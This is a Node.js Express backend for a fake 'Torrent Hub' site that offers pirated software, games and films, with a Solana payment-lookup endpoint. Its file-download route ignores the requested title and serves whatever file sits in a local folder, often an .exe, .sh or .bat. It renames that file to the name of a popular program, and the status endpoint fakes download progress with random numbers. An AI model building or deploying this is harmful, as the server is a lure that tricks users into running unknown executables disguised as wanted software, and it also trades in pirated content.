const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const { Connection, LAMPORTS_PER_SOL } = require('@solana/web3.js');

// Solana connection (devnet)
const solanaConnection = new Connection('https://api.devnet.solana.com', 'confirmed');

const app = express();
const PORT = process.env.PORT || 3001;

// Enable CORS for frontend
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST'],
}));

app.use(express.json());

// Create downloads directory if it doesn't exist
const downloadsDir = path.join(__dirname, 'downloads');
if (!fs.existsSync(downloadsDir)) {
  fs.mkdirSync(downloadsDir, { recursive: true });
}

// Mock torrent data with file paths
const torrentFiles = {
  1: { name: 'Adobe_Photoshop_2024.zip', size: '4.2 GB' },
  2: { name: 'Red_Dead_Redemption_2.zip', size: '119.5 GB' },
  3: { name: 'Oppenheimer_2023_4K.mkv', size: '32.1 GB' },
  4: { name: 'GTA_V_Premium.zip', size: '98.2 GB' },
  5: { name: 'Ableton_Live_11.zip', size: '2.8 GB' },
  6: { name: 'Kali_Linux_2024.iso', size: '3.9 GB' },
};

// API endpoint to initiate download
app.post('/api/download', (req, res) => {
  const { torrentId, title } = req.body;

  if (!torrentId) {
    return res.status(400).json({ error: 'Torrent ID is required' });
  }

  const torrent = torrentFiles[torrentId];

  if (!torrent) {
    return res.status(404).json({ error: 'Torrent not found' });
  }

  // Simulate download initiation
  console.log(`📥 Download initiated for: ${title || torrent.name}`);
  console.log(`   File size: ${torrent.size}`);
  console.log(`   Torrent ID: ${torrentId}`);

  // In a real application, you would:
  // 1. Add the magnet link to a torrent client (e.g., WebTorrent)
  // 2. Track download progress
  // 3. Stream the file to the downloads folder

  res.json({
    success: true,
    message: `Download started for ${title || torrent.name}`,
    torrentId,
    fileName: torrent.name,
    fileSize: torrent.size,
    downloadPath: path.join(downloadsDir, torrent.name),
  });
});

// Files directory for actual downloadable files
const filesDir = path.join(__dirname, 'files');
if (!fs.existsSync(filesDir)) {
  fs.mkdirSync(filesDir, { recursive: true });
}

// API endpoint to serve file download
app.get('/api/download/file/:torrentId', (req, res) => {
  const { torrentId } = req.params;
  const torrent = torrentFiles[torrentId];

  if (!torrent) {
    return res.status(404).json({ error: 'Torrent not found' });
  }

  // Get files from the 'files' folder
  const availableFiles = fs.readdirSync(filesDir);

  if (availableFiles.length === 0) {
    return res.status(404).json({ error: 'No files available for download. Please add files to the backend/files folder.' });
  }

  // Get the first available file (you can customize this logic)
  const sourceFile = availableFiles[0];
  const sourceFilePath = path.join(filesDir, sourceFile);

  // Get the original extension from the source file
  const originalExtension = path.extname(sourceFile); // e.g., '.exe', '.sh'

  // Create download filename: torrent name + original extension
  // Remove any existing extension from torrent name and add the source file's extension
  const torrentBaseName = torrent.name.replace(/\.[^.]+$/, ''); // Remove extension like .zip, .mkv
  const downloadFileName = `${torrentBaseName}${originalExtension}`;

  console.log(`📤 Serving download: ${downloadFileName}`);
  console.log(`   Source file: ${sourceFile}`);
  console.log(`   Original extension preserved: ${originalExtension}`);

  // Determine content type based on extension
  const contentTypes = {
    '.exe': 'application/octet-stream',
    '.sh': 'application/x-sh',
    '.zip': 'application/zip',
    '.dmg': 'application/octet-stream',
    '.app': 'application/octet-stream',
    '.msi': 'application/octet-stream',
    '.bat': 'application/x-bat',
    '.cmd': 'application/x-bat',
  };

  const contentType = contentTypes[originalExtension.toLowerCase()] || 'application/octet-stream';

  // Set headers for file download
  res.setHeader('Content-Disposition', `attachment; filename="${downloadFileName}"`);
  res.setHeader('Content-Type', contentType);

  // Send the actual file
  res.sendFile(sourceFilePath);
});

// API endpoint to check download status
app.get('/api/download/status/:torrentId', (req, res) => {
  const { torrentId } = req.params;

  // Mock status - in real app, track actual download progress
  res.json({
    torrentId,
    status: 'downloading',
    progress: Math.floor(Math.random() * 100),
    speed: `${(Math.random() * 10).toFixed(1)} MB/s`,
    peers: Math.floor(Math.random() * 100),
  });
});

// API endpoint to list all downloads
app.get('/api/downloads', (req, res) => {
  const files = fs.readdirSync(downloadsDir);
  res.json({
    downloads: files,
    path: downloadsDir,
  });
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', message: 'Torrent Hub Backend is running' });
});

// Solana Transaction API - Get transfer details from signature
app.get('/api/solana/transaction/:signature', async (req, res) => {
  try {
    const { signature } = req.params;

    if (!signature) {
      return res.status(400).json({ error: 'Transaction signature is required' });
    }

    const tx = await solanaConnection.getTransaction(signature, {
      maxSupportedTransactionVersion: 0,
    });

    if (!tx) {
      return res.status(404).json({ error: 'Transaction not found' });
    }

    const { transaction, meta } = tx;
    const message = transaction.message;
    const accountKeys = message.staticAccountKeys || message.accountKeys;
    const preBalances = meta.preBalances;
    const postBalances = meta.postBalances;

    let sender = null;
    let receiver = null;
    let amountSol = 0;

    // System Program ID (for SOL transfers)
    const SYSTEM_PROGRAM_ID = '11111111111111111111111111111111';

    // Try to parse transfer instruction from compiled instructions
    const instructions = message.compiledInstructions || message.instructions;

    if (instructions && instructions.length > 0) {
      for (const ix of instructions) {
        const programIdIndex = ix.programIdIndex;
        const programId = accountKeys[programIdIndex]?.toBase58();

        // Check if it's a System Program instruction
        if (programId === SYSTEM_PROGRAM_ID) {
          const accounts = ix.accountKeyIndexes || ix.accounts;
          const data = ix.data;

          // System Program Transfer instruction type is 2
          // Data format: [instruction_type (4 bytes), amount (8 bytes)]
          if (data && accounts && accounts.length >= 2) {
            // Decode instruction data
            let instructionData;
            if (typeof data === 'string') {
              // Base58 encoded
              instructionData = Buffer.from(data, 'base64');
            } else if (data.data) {
              instructionData = Buffer.from(data.data);
            } else {
              instructionData = Buffer.from(data);
            }

            // Check if it's a transfer instruction (type 2)
            if (instructionData.length >= 12) {
              const instructionType = instructionData.readUInt32LE(0);
              if (instructionType === 2) {
                // It's a transfer instruction
                const lamports = instructionData.readBigUInt64LE(4);
                amountSol = Number(lamports) / LAMPORTS_PER_SOL;
                sender = accountKeys[accounts[0]]?.toBase58();
                receiver = accountKeys[accounts[1]]?.toBase58();
                break;
              }
            }
          }
        }
      }
    }

    // Fallback to balance-based detection if instruction parsing failed
    if (!sender || !receiver) {
      let senderDiff = 0;
      let receiverDiff = 0;

      for (let i = 0; i < accountKeys.length; i++) {
        const diff = postBalances[i] - preBalances[i];
        if (diff < 0 && diff < senderDiff) {
          senderDiff = diff;
          sender = accountKeys[i].toBase58();
        }
        if (diff > 0 && diff > receiverDiff) {
          receiverDiff = diff;
          receiver = accountKeys[i].toBase58();
        }
      }

      if (receiverDiff > 0) {
        amountSol = receiverDiff / LAMPORTS_PER_SOL;
      } else if (senderDiff < 0 && amountSol === 0) {
        amountSol = (Math.abs(senderDiff) - meta.fee) / LAMPORTS_PER_SOL;
        if (amountSol <= 0) amountSol = 0;
      }
    }

    console.log(`🔗 Solana TX lookup: ${signature.slice(0, 20)}...`);
    console.log(`   Sender: ${sender}`);
    console.log(`   Receiver: ${receiver}`);
    console.log(`   Amount: ${amountSol} SOL`);

    res.json({
      success: true,
      signature,
      sender,
      receiver,
      amountSol,
      isSelfTransfer: sender === receiver,
      fee: meta.fee / LAMPORTS_PER_SOL,
      slot: tx.slot,
      blockTime: tx.blockTime,
    });
  } catch (error) {
    console.error('Solana transaction error:', error);
    res.status(500).json({ error: 'Failed to fetch transaction', details: error.message });
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔════════════════════════════════════════════════════════════╗
║   🧲 TORRENT HUB BACKEND                                   ║
║   Server running on port ${PORT}                           ║
║   Downloads folder: ${downloadsDir}                        ║
╚════════════════════════════════════════════════════════════╝
  `);
});
